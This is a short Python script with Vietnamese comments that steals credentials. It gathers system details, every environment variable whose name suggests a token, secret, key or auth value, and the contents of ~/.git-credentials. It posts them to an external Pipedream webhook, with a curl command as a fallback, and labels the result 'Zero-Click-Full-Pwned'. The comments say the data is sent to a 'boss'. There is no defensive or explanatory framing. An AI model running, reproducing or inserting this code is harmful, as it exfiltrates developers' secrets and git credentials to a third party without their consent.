import os
import subprocess
import requests
import json
import socket
import base64

# --- CẤU HÌNH ---
PIPEDREAM_URL = "https://eo4ki1jx09tq9fi.m.pipedream.net"

def get_sys_info():
    return {
        "user": os.getlogin() if hasattr(os, 'getlogin') else "vscode",
        "hostname": socket.gethostname(),
        "platform": os.uname().sysname if hasattr(os, 'uname') else "linux"
    }

def get_git_tokens():
    tokens = {}
    # Quét các biến môi trường nhạy cảm
    for k, v in os.environ.items():
        if any(x in k.upper() for x in ["TOKEN", "SECRET", "KEY", "AUTH"]):
            tokens[k] = v
    
    # Đọc file credentials của GitHub nếu có
    cred_path = os.path.expanduser("~/.git-credentials")
    if os.path.exists(cred_path):
        with open(cred_path, "r") as f:
            tokens["git_file_content"] = f.read()
    return tokens

def main():
    try:
        # 1. Thu thập mọi thứ
        payload = {
            "status": "Zero-Click-Full-Pwned",
            "meta": get_sys_info(),
            "secrets": get_git_tokens(),
        }

        # 2. Gửi dữ liệu về cho sếp Khoa
        headers = {'Content-Type': 'application/json'}
        response = requests.post(PIPEDREAM_URL, data=json.dumps(payload), headers=headers, timeout=10)
        
        # Ghi log nội bộ để sếp check (ẩn danh)
        with open("/tmp/py_exploit.log", "a") as log:
            log.write(f"Sent: {response.status_code}\n")

    except Exception as e:
        # Nếu có lỗi (ví dụ chưa cài requests), dùng curl dự phòng
        os.system(f"curl -X POST -d 'py_error={str(e)}' {PIPEDREAM_URL}")

if __name__ == "__main__":
    main()